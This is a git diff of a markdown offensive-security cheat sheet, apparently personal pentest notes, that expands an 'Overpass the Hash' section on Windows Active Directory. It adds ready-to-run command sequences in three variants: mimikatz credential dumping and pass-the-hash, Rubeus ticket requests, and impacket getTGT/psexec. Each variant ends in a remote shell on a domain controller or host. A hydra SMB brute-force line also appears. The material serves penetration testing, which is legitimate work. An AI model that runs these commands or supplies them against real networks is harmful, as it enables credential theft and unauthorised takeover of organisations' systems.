@@ -475,25 +475,7 @@ hydra smb://microsoft.com  -l username -P passwords.txt -m "other_domain:SECONDD
 
 ### Overpass the Hash
 
-This attack uses NTLM hash to obtain a TGT to gain further access
-
-```bash
-#use mimikatz to obtain powershell session as admin if NTLM hash is available
-
-Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] 
-
-
-```
-
-* sometimes it is needed to authenticate with current session to obtain TGT
-
-`net use \\dc01`
-
-after that DC shall provide a TGT
-
-* use psexec to gain remote access
-
-`.\PsExec.exe \\dc01 cmd.exe`
+This attack uses NTLM hash to obtain a TGT to gain further access if user was logged on on the compromised machine where you fot SYSTEM rights.
 
 Also possible to generate NTLM hash in linux if password is given
 
@@ -505,8 +487,63 @@ printf '%s' "$pw" | iconv -t utf16le | openssl md4
 #thats NT hash
 MD4(stdin)= 58a478135a93ac3bf058a5ea0e8fdb71
 
+```
+
+#### Option A: mimikatz
+
+```powershell
+
+privilege::debug
+
+sekurlsa::logonpasswords
+
+# copy NTLM for the user in scope
+
+# perform pass the hash
+
+sekurlsa::pth /user:user101 /domain:scorp.com /ntlm:1234ef79d8372408bf6e93364cc93075 /run:powershell
+
+# access some service to grab TGT
+net use \\DC01
+
+# run psexec
+
+.\ps.exe -accepteula \\dc01 cmd
+
+# enjoy!
 
 ```
+
+#### Option B: rubeus
+
+
+```bash
+
+
+#use mimikatz to obtain powershell session as admin if NTLM hash is available
+
+Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] 
+
+
+```
+
+
+#### Option c: impacket
+
+```bash
+
+impacket-getTGT scorp.com/Administrator -hashes :9bff06fe611486579fb74037890fda96 -dc-ip 192.168.219.154
+
+# perform some magic to inject ticket to ccache
+
+export KRB5CCNAME=/path/to/your/credential/cache
+
+# start impackets psexec an use ccache
+
+impacket-psexec -no-pass -k -dc-ip 198.xxx.xxx.xxx scorp.com/admin@PC1 cmd
+
+```
+
 
 ### Brute Force ASREP roast
 
